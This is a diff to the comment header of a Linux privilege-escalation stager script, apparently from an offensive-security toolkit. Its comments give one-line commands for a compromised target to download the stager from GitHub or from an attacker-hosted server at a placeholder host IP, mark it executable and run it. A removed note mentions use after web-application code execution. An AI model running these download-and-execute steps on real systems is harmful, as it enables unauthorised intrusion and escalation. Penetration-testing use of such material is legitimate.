@@ -4,12 +4,12 @@
 # if the target is able to contact github, use the below one liner for the quickest method.
 # cd /tmp/ && wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/LinuxStager.sh && chmod +x LinuxStager.sh && ./LinuxStager.sh https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/
 #
-# if the target is only able to connect back to you download, use the below
-# host machine: wget files
-# host machine python -m SimpleHttpServer 6666
-# Target machine: cd /tmp/ && wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/LinuxStager.sh && chmod +x LinuxStager.sh && ./LinuxStager.sh
+# If the target is only able to connect back to you download, use the below
+# steps: 
+# 1: Host Machine:   cd /tmp/ && git clone https://github.com/WillChaos/OFFSEC.git && cd OFFSEC/PrivEsc/ && python -m SimpleHTTPServer 81
+# 2: Target Machine: cd /tmp/ && wget http://<hostIP>:81/LinuxStager.sh && chmod +x LinuxStager.sh && ./LinuxStager.sh <hostIP>:81
 # ---------------------------------------------------------------------------------------------------------------------------------
-# (note: ive run this from a tedious code execution on a web application and got a bind shell, with all prereqs staged. it can save lifes)
+
 
 if [ -z "$1" ]
   then
